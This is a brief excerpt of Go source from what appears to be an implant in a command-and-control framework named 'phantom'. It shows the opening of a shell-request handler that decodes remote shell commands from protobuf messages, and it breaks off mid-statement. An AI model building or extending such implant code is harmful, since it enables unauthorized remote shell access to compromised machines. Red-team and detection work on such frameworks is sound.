...
import (
	...
	"github.com/cryptdefender3232/phantom/implant/phantom/shell"
...
func ShellReqHandler(envelope *phantompb.Envelope, connection *transports.Connection) {

	shellReq := &phantompb.ShellReq{}
	err := proto.Unmarshal(envelope.Data, shellReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[shell] Failed to unmarshal protobuf %s", err)
		// {{end}}
		shellResp, _ := proto.Marshal(&phantompb.Shell{
